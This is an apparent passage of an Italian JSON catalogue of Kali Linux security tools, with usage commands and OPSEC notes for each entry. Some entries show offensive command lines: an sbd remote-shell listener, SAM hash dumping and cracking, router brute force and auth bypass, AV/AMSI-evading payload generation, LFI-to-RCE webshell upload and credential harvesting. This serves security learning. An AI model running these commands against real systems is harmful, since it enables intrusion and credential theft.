    "desc": "Plugin che integra decompiler Ghidra in Rizin per analisi codice decompilato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rz-ghidra</strong> è un plugin che integra il decompiler di Ghidra in Rizin. Permette di ottenere output pseudo-C delle funzioni analizzate direttamente in Rizin/Cutter senza necessità di usare Ghidra standalone.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decompilation:</strong> pseudo-C da disassembly</p><p><strong>Integration:</strong> seamless con Rizin e Cutter</p><p><strong>Sync:</strong> sincronizzazione con vista disassembly</p><p><strong>Renaming:</strong> modifiche propagate al decompiler</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># In Rizin, dopo analisi\npdg @main    # Decompila funzione main\n\n# In Cutter GUI\n# Pannello Decompiler automaticamente disponibile\n# Seleziona funzione per vedere pseudo-C</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>reverse engineering</strong>, comprensione rapida logica funzioni. Per <strong>malware analysis</strong>, analisi comportamento con codice leggibile. Per <strong>vulnerability research</strong>, identificazione bug nel pseudo-C.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Accuracy:</strong> decompilazione non sempre perfetta. <strong>Optimization:</strong> codice ottimizzato può produrre output confuso. <strong>Resources:</strong> decompilazione richiede risorse significative.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Reverse_Engineering"
    ],
    "notes": null
  },
  {
    "id": "s3scanner",
    "name": "s3scanner",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/s3scanner/",
    "desc": "Trova bucket S3 pubblici e misconfigured con enumeration di file e permessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>S3Scanner</strong> trova bucket AWS S3 pubblici e misconfigured. Enumera contenuti, verifica permessi di lettura/scrittura e identifica dati sensibili esposti. Essenziale per cloud security assessment e bug bounty.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bucket Discovery:</strong> enumera bucket da wordlist o pattern</p><p><strong>Permission Check:</strong> verifica read/write/list permissions</p><p><strong>Content Listing:</strong> enumera oggetti nei bucket accessibili</p><p><strong>Dump Support:</strong> scarica contenuti di bucket pubblici</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan lista bucket\ns3scanner scan -b buckets.txt\n\n# Generazione nomi da keyword\ns3scanner scan -k company\n\n# Con dump contenuti\ns3scanner scan -b bucket.txt --dump\n\n# Verifica singolo bucket\ns3scanner scan -b company-backup</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>cloud security</strong>, identificazione bucket S3 esposti. Per <strong>bug bounty</strong>, discovery data leak su target. Per <strong>OSINT</strong>, ricerca informazioni in bucket pubblici.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legal:</strong> accesso a bucket non autorizzati potrebbe essere illegale. <strong>Rate limiting:</strong> AWS può limitare richieste eccessive. <strong>Logging:</strong> accessi S3 loggati in CloudTrail.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "samdump2",
    "name": "samdump2",
    "version": "3.0.0",
    "icon": "../app/icons/samdump2-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/samdump2/",
    "desc": "Estrae hash password da file SAM e SYSTEM Windows per cracking offline.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>samdump2</strong> estrae hash password NTLM/LM dal file SAM di Windows usando la chiave di cifratura dal file SYSTEM. Permette cracking offline degli hash con hashcat/john dopo aver ottenuto i file da sistema target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Hash Extraction:</strong> estrae NTLM e LM hash dal SAM</p><p><strong>SYSTEM Key:</strong> usa bootkey da SYSTEM per decifratura</p><p><strong>Offline:</strong> lavora su file exportati, non sistema live</p><p><strong>Output Format:</strong> formato compatibile con john/hashcat</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Estrazione hash\nsamdump2 SYSTEM SAM\n\n# Output su file per cracking\nsamdump2 SYSTEM SAM > hashes.txt\n\n# Poi cracking con hashcat\nhashcat -m 1000 hashes.txt wordlist.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password cracking</strong>, recupero password da SAM offline. Per <strong>forensics</strong>, analisi credenziali su sistema sequestrato. Per <strong>pentest</strong>, crack hash dopo dump SAM.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>File Access:</strong> SAM e SYSTEM sono bloccati su sistema live. <strong>Boot CD:</strong> usare Kali Live o simile per accesso offline. <strong>Reg save:</strong> può copiare hive da sistema con privilegi admin.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "sara",
    "name": "sara",
    "version": "1.2",
    "icon": "../app/icons/sara-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sara/",
    "desc": "RouterOS security auditing: brute force, config dump, exploit Winbox su Mikrotik.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SARA</strong> (Sekurak RouterOS Audit) è un tool per security assessment di dispositivi Mikrotik RouterOS. Supporta brute force credenziali, dump configurazione, exploit di vulnerabilità Winbox note e enumeration di servizi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Credential Brute:</strong> attacco password su SSH, Telnet, Winbox</p><p><strong>Config Dump:</strong> estrazione configurazione router</p><p><strong>Winbox Exploits:</strong> sfruttamento vulnerabilità note</p><p><strong>Enumeration:</strong> discovery versione e servizi attivi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan e enumeration\nsara -t 192.168.1.1\n\n# Brute force\nsara -t 192.168.1.1 -b -u admin -P passwords.txt\n\n# Exploit CVE specifico\nsara -t 192.168.1.1 -e winbox_auth_bypass</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network pentest</strong>, assessment router Mikrotik. Per <strong>ISP audit</strong>, verifica sicurezza infrastruttura. Per <strong>research</strong>, test vulnerabilità RouterOS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> brute force può bloccare account. <strong>Logging:</strong> tentativi loggati su router. <strong>Updates:</strong> Mikrotik patcha vulnerabilità regolarmente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "IoT"
    ],
    "notes": null
  },
  {
    "id": "sbd",
    "name": "sbd",
    "version": "1.37",
    "icon": "../app/icons/sbd-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sbd/",
    "desc": "Secure Backdoor: netcat crittografato con AES per comunicazioni covert persistenti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SBD</strong> (Secure BackDoor) è una versione crittografata di netcat che utilizza AES-CBC-128 per cifrare le comunicazioni. Fornisce shell remote sicure, trasferimento file crittografato e può essere usato per comunicazioni covert.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>AES Encryption:</strong> traffico cifrato con AES-CBC-128</p><p><strong>Shared Secret:</strong> autenticazione con password condivisa</p><p><strong>Netcat Compatible:</strong> sintassi simile a netcat</p><p><strong>Cross-platform:</strong> versioni per Linux e Windows</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Listener con password\nsbd -l -p 4444 -k secret\n\n# Connessione client\nsbd target_ip 4444 -k secret\n\n# Shell remota\nsbd -l -p 4444 -k secret -e /bin/sh\n\n# File transfer\nsbd -l -p 4444 -k secret < file.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>secure C2</strong>, comunicazioni crittografate con backdoor. Per <strong>pivoting</strong>, tunnel sicuri attraverso reti ostili. Per <strong>exfiltration</strong>, trasferimento dati cifrato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> traffico cifrato anomalo può essere rilevato. <strong>Key exchange:</strong> chiave deve essere condivisa out-of-band. <strong>Forensics:</strong> binario su disco è evidenza.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "scalpel",
    "name": "scalpel",
    "version": "1.60",
    "icon": "../app/icons/scalpel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scalpel/",
    "desc": "File carver veloce per recupero dati da immagini disco basato su header/footer.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scalpel</strong> è un file carver veloce e indipendente dal filesystem. Recupera file da immagini disco basandosi su header e footer di file type noti. Fork di Foremost ottimizzato per velocità e ridotto uso memoria.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Signature-based:</strong> recupero basato su magic bytes</p><p><strong>Filesystem-agnostic:</strong> funziona su qualsiasi filesystem o raw</p><p><strong>Configurable:</strong> definizione custom di header/footer</p><p><strong>Fast:</strong> ottimizzato per prestazioni su grandi immagini</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Carving con config default\nscalpel disk.img -o output_dir/\n\n# Con config personalizzato\nscalpel -c custom_scalpel.conf disk.img -o output/\n\n# Su device raw\nscalpel /dev/sdb -o recovered/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>forensics</strong>, recupero file cancellati da immagini. Per <strong>data recovery</strong>, recupero da dischi corrotti. Per <strong>incident response</strong>, estrazione artefatti da sistemi compromessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Fragmentation:</strong> file frammentati potrebbero non essere recuperati completamente. <strong>False positives:</strong> signature match può produrre file corrotti. <strong>Space:</strong> output può essere molto grande.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "scapy",
    "name": "scapy",
    "version": "2.6.1",
    "icon": "../app/icons/scapy-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scapy/",
    "desc": "Libreria Python per manipolazione pacchetti: forging, sniffing, fuzzing a basso livello.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Scapy</strong> è una potente libreria Python per manipolazione pacchetti di rete a basso livello. Permette forging, sending, sniffing, parsing e fuzzing di pacchetti per qualsiasi protocollo. Strumento fondamentale per network security research.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Packet Crafting:</strong> costruzione pacchetti layer by layer</p><p><strong>Sniffing:</strong> cattura e analisi traffico di rete</p><p><strong>Protocol Support:</strong> TCP, UDP, ICMP, ARP, DNS, HTTP e centinaia altri</p><p><strong>Fuzzing:</strong> generazione pacchetti malformati per testing</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Shell interattiva\nscapy\n\n# Crafting e invio pacchetto\n>>> send(IP(dst=\"target\")/ICMP())\n\n# Sniffing\n>>> sniff(filter=\"tcp port 80\", count=10)\n\n# SYN scan\n>>> sr1(IP(dst=\"target\")/TCP(dport=80,flags=\"S\"))</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network research</strong>, analisi e testing protocolli. Per <strong>exploit development</strong>, crafting pacchetti per vulnerabilità. Per <strong>fuzzing</strong>, testing robustezza stack di rete.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Raw sockets:</strong> richiede privilegi root. <strong>Detection:</strong> pacchetti malformati facilmente rilevabili. <strong>Learning:</strong> richiede conoscenza protocolli di rete.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "scrounge-ntfs",
    "name": "scrounge-ntfs",
    "version": "0.9",
    "icon": "../app/icons/scrounge-ntfs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/scrounge-ntfs/",
    "desc": "Recupera file da partizioni NTFS danneggiate ricostruendo MFT entries.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>scrounge-ntfs</strong> recupera file da partizioni NTFS danneggiate ricostruendo le entry della Master File Table (MFT). Utile quando il filesystem è corrotto ma i dati sono ancora fisicamente presenti sul disco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>MFT Recovery:</strong> ricostruisce entry MFT danneggiate</p><p><strong>File Extraction:</strong> recupera file con metadata preservati</p><p><strong>Sector Scan:</strong> scansione settore per settore</p><p><strong>NTFS Specific:</strong> ottimizzato per strutture NTFS</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan partizione NTFS\nscrounge-ntfs /dev/sdb1 /output_dir/\n\n# Con range settori specifico\nscrounge-ntfs -s 0 -e 1000000 /dev/sdb1 /output/\n\n# Da immagine disco\nscrounge-ntfs disk.img /recovered/</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>data recovery</strong>, recupero da NTFS corrotto. Per <strong>forensics</strong>, estrazione file da sistemi Windows danneggiati. Per <strong>incident response</strong>, recovery dopo ransomware o corruzione.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Read-only:</strong> non modifica disco sorgente. <strong>NTFS only:</strong> non supporta altri filesystem. <strong>Partial:</strong> file molto frammentati potrebbero non essere recuperati completamente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "File_Carving"
    ],
    "notes": null
  },
  {
    "id": "sctpscan",
    "name": "sctpscan",
    "version": "0.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sctpscan/",
    "desc": "Scanner per protocollo SCTP usato in telecomunicazioni e reti SS7.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SCTPscan</strong> è uno scanner per il protocollo SCTP (Stream Control Transmission Protocol) usato in telecomunicazioni, VoIP e reti SS7. Identifica host con porte SCTP aperte, utile per security assessment su infrastrutture telco.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SCTP Scan:</strong> discovery porte SCTP aperte</p><p><strong>Association:</strong> tenta stabilire SCTP associations</p><p><strong>Port Range:</strong> scan di range porte specificato</p><p><strong>Telecom Focus:</strong> porte comuni SS7/Diameter preconfigurate</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan singolo host\nsctpscan -t target_ip\n\n# Scan range porte\nsctpscan -t target -p 1-10000\n\n# Scan subnet\nsctpscan -t 192.168.1.0/24\n\n# Porte SS7 comuni\nsctpscan -t target -p 2905,2945,3868</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>telecom security</strong>, assessment infrastrutture SS7/Diameter. Per <strong>VoIP pentesting</strong>, discovery servizi SIP/SCTP. Per <strong>research</strong>, analisi protocolli telecomunicazioni.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Niche:</strong> SCTP meno comune di TCP/UDP. <strong>Telecom:</strong> reti telco spesso isolate e monitorate. <strong>Legal:</strong> scan su infrastrutture telco richiede autorizzazione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "secure-socket-funneling",
    "name": "secure-socket-funneling",
    "version": "3.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/secure-socket-funneling/",
    "desc": "Tunneling TCP/UDP attraverso TLS con forward/reverse proxy per pivoting sicuro.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Secure Socket Funneling</strong> (SSF) crea tunnel TCP e UDP cifrati con TLS. Supporta forward proxy, reverse proxy, SOCKS proxy e port forwarding. Alternativa moderna a SSH tunneling con supporto UDP nativo.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TLS Encryption:</strong> tutto il traffico cifrato</p><p><strong>TCP/UDP:</strong> supporto entrambi i protocolli</p><p><strong>Proxy Modes:</strong> forward, reverse, SOCKS</p><p><strong>Multi-hop:</strong> catene di tunnel attraverso relay</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server\nssfd -p 8080\n\n# Client con port forward locale\nssf -L 9000:internal:22 -p 8080 relay_server\n\n# Remote port forward\nssf -R 9000:localhost:22 -p 8080 relay_server\n\n# SOCKS proxy\nssf -D 1080 -p 8080 relay_server</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>pivoting</strong>, accesso sicuro a reti interne. Per <strong>firewall bypass</strong>, tunnel attraverso porte consentite. Per <strong>UDP tunneling</strong>, protocolli UDP attraverso firewall.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>TLS traffic:</strong> appare come HTTPS normale. <strong>Certificates:</strong> usa certificati custom configurabili. <strong>Detection:</strong> deep inspection può identificare pattern.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "sendemail",
    "name": "sendemail",
    "version": "1.56",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sendemail/",
    "desc": "Invia email da CLI con supporto SMTP auth, TLS e allegati per test phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>sendEmail</strong> è un tool CLI per invio email con supporto SMTP authentication, TLS/SSL e allegati. Utile per test di phishing, notifiche automatizzate da script e verifica configurazione server email.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SMTP Auth:</strong> supporto autenticazione PLAIN, LOGIN, CRAM-MD5</p><p><strong>TLS/SSL:</strong> connessioni sicure a server email</p><p><strong>Attachments:</strong> invio file allegati</p><p><strong>HTML Email:</strong> supporto corpo email HTML</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Email semplice\nsendemail -f sender@mail.com -t target@mail.com -u \"Subject\" -m \"Body\" -s smtp.server.com\n\n# Con autenticazione\nsendemail -f from@mail.com -t to@mail.com -u \"Subject\" -m \"Body\" -s smtp:587 -xu user -xp pass -o tls=yes\n\n# Con allegato\nsendemail -f from@mail.com -t to@mail.com -u \"Subject\" -m \"Body\" -a file.pdf -s smtp.server.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing tests</strong>, invio email di test in campagne autorizzate. Per <strong>automation</strong>, notifiche email da script. Per <strong>SMTP testing</strong>, verifica configurazione server.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> server SMTP loggano invii. <strong>SPF/DKIM:</strong> email spoofate potrebbero essere bloccate. <strong>Headers:</strong> IP sorgente visibile negli header.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "set",
    "name": "set",
    "version": "8.0.3",
    "icon": "../app/icons/set-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/set/",
    "desc": "Social Engineering Toolkit: phishing, credential harvester, payload injection e spear-phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SET</strong> (Social Engineering Toolkit) è il framework standard per attacchi di social engineering. Include moduli per phishing, credential harvesting, payload generation, spear-phishing con allegati malevoli e molto altro. Sviluppato da TrustedSec.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Website Clone:</strong> clona siti per credential harvesting</p><p><strong>Spear-phishing:</strong> email con payload malevoli</p><p><strong>Payload Generator:</strong> integrazione con Metasploit</p><p><strong>USB/CD Attack:</strong> autorun per media fisici</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio SET\nsetoolkit\n\n# Menu principale\n1) Social-Engineering Attacks\n2) Website Attack Vectors\n3) Credential Harvester\n\n# Esempio credential harvester\n# Clone sito -> inserisci URL -> attendi credenziali</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing assessment</strong>, test awareness dipendenti. Per <strong>red team</strong>, initial access via social engineering. Per <strong>training</strong>, dimostrazioni su rischi phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Authorization:</strong> richiede sempre autorizzazione scritta. <strong>Legal:</strong> phishing non autorizzato è illegale. <strong>Infra:</strong> domain e hosting per campagne realistiche.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "sfuzz",
    "name": "sfuzz",
    "version": "0.7.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sfuzz/",
    "desc": "Simple fuzzer per protocolli di rete con pattern e payload personalizzabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Sfuzz</strong> è un fuzzer semplice per protocolli di rete. Invia payload personalizzabili a servizi TCP/UDP per identificare crash, memory corruption e altre vulnerabilità. Approccio leggero e configurabile per vulnerability research.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Protocol Agnostic:</strong> fuzzing su qualsiasi protocollo TCP/UDP</p><p><strong>Pattern Based:</strong> definizione pattern con placeholder fuzz</p><p><strong>Incremental:</strong> incremento graduale dimensione payload</p><p><strong>Configurable:</strong> template personalizzabili per ogni protocollo</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Fuzzing con config file\nsfuzz -f config.sfz\n\n# Config file esempio\n# tcp\n# 192.168.1.1:80\n# GET /%%FUZZ%% HTTP/1.0\n\n# Con incremento lunghezza\nsfuzz -f config.sfz -l 1000 -i 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>vulnerability research</strong>, discovery bug in servizi custom. Per <strong>protocol testing</strong>, robustezza parser di protocollo. Per <strong>learning</strong>, introduzione al fuzzing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Crashes:</strong> fuzzing può crashare servizi. <strong>Detection:</strong> traffico anomalo facilmente rilevabile. <strong>DoS:</strong> può causare denial of service non intenzionale.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "sharphound",
    "name": "sharphound",
    "version": "2.7.1",
    "icon": "../app/icons/sharphound-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharphound/",
    "desc": "Collector BloodHound per AD: enumera utenti, gruppi, sessioni, ACL per attack paths.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpHound</strong> è il collector ufficiale per BloodHound, enumera Active Directory raccogliendo utenti, gruppi, computer, sessioni, ACL e trust. I dati vengono importati in BloodHound per visualizzare e scoprire attack paths verso Domain Admin.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete Enumeration:</strong> utenti, gruppi, computer, GPO, OU</p><p><strong>Session Collection:</strong> sessioni attive per mappare lateral movement</p><p><strong>ACL Analysis:</strong> permessi e deleghe pericolose</p><p><strong>Stealth Modes:</strong> opzioni per ridurre rumore</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Collection completa\nSharpHound.exe -c All\n\n# Solo sessioni (più stealth)\nSharpHound.exe -c Session\n\n# Con dominio specifico\nSharpHound.exe -c All -d domain.local\n\n# Loop per sessioni continue\nSharpHound.exe -c Session --loop</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AD assessment</strong>, mappatura completa attack paths. Per <strong>privesc planning</strong>, identificazione percorsi verso Domain Admin. Per <strong>security audit</strong>, visualizzazione rischi ACL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Detection:</strong> enumeration AD monitorata da MDI/ATA. <strong>Volume:</strong> collection genera molte query LDAP. <strong>Stealth:</strong> usare collection methods selettivi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpshooter",
    "name": "sharpshooter",
    "version": "2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/sharpshooter/",
    "desc": "Genera payload stageless in VBA, JS, HTA con tecniche di evasione AV integrate.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SharpShooter</strong> genera payload stageless per initial access in formati VBA, JavaScript, HTA, VBS. Include tecniche di evasione AV/AMSI integrate, sandbox detection e multiple delivery methods per campagne red team.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multiple Formats:</strong> VBA macro, JS, HTA, VBS, SCT</p><p><strong>Stageless:</strong> payload completo nel documento</p><p><strong>AMSI Bypass:</strong> tecniche anti-AMSI integrate</p><p><strong>Sandbox Evasion:</strong> detection ambiente analisi</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Genera HTA con shellcode\nSharpShooter.py --payload hta --delivery web --output payload.hta --shellcode shellcode.bin\n\n# VBA macro\nSharpShooter.py --payload vba --delivery macro --output macro.vba\n\n# Con AMSI bypass\nSharpShooter.py --payload js --amsi amsienable</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>red team</strong>, initial access via macro/script malevoli. Per <strong>phishing</strong>, payload per allegati email. Per <strong>testing</strong>, verifica detection capabilities AV.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Signatures:</strong> payload noti, detection rate variabile. <strong>Customization:</strong> modificare template per evasione. <strong>Delivery:</strong> hosting payload richiede infrastruttura.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "Payload_Generation"
    ],
    "notes": null
  },
  {
    "id": "shellfire",
    "name": "shellfire",
    "version": "0.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellfire/",
    "desc": "Sfrutta vulnerabilità LFI per ottenere shell remote su server web vulnerabili.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Shellfire</strong> automatizza lo sfruttamento di vulnerabilità LFI (Local File Inclusion) per ottenere shell remote. Utilizza tecniche come log poisoning, /proc/self/environ injection e PHP wrappers per escalare LFI a RCE.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LFI to RCE:</strong> escalation automatica da LFI a shell</p><p><strong>Log Poisoning:</strong> injection in log files per code execution</p><p><strong>PHP Wrappers:</strong> base64, data, expect per bypass</p><p><strong>Auto Shell:</strong> upload automatico webshell</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Exploit LFI automatico\nshellfire -u \"http://target/page.php?file=\" -l\n\n# Con tecnica specifica\nshellfire -u \"http://target/page.php?file=\" -t logpoisoning\n\n# PHP wrapper\nshellfire -u \"http://target/page.php?file=\" -t phpwrapper</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web exploitation</strong>, escalation LFI trovate durante pentest. Per <strong>CTF</strong>, challenge con vulnerabilità LFI. Per <strong>research</strong>, test tecniche LFI to RCE.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logs:</strong> tentativi LFI loggati dal web server. <strong>WAF:</strong> pattern LFI comuni bloccati. <strong>Cleanup:</strong> webshell uploadate vanno rimosse.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Web",
      "Injection",
      "LFI"
    ],
    "notes": null
  },
  {
    "id": "shellnoob",
    "name": "shellnoob",
    "version": "2.1",
    "icon": "../app/icons/shellnoob-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/shellnoob/",
    "desc": "Toolkit per sviluppo shellcode: assembla, disassembla, converti in vari formati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Shellnoob è un toolkit per lo sviluppo di shellcode che semplifica il processo di assemblaggio, disassemblaggio e conversione tra formati. Supporta multiple architetture e facilita il workflow di exploit development.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Assembler/Disassembler:</strong> converte tra assembly e opcodes binari</p><p><strong>Format Conversion:</strong> trasforma shellcode in C, Python, hex, raw</p><p><strong>Multi-Architecture:</strong> supporta x86, x86_64, ARM</p><p><strong>Interactive Mode:</strong> sviluppo iterativo di shellcode</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Assembla file .asm in raw shellcode\nshellnoob -f payload.asm --to-bin\n\n# Converti raw in formato C\nshellnoob -f payload.bin --to-c\n\n# Disassembla opcodes\nshellnoob --from-hex '\\x31\\xc0\\x50' --to-asm\n\n# Modalità interattiva\nshellnoob -i</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>exploit development</strong>, sviluppa e testa shellcode custom. Per <strong>format conversion</strong>, trasforma payload tra diversi formati. Per <strong>debugging</strong>, analizza e modifica shellcode esistente.</p><br><hr><h4 class=\"rt-red\">Considerazioni 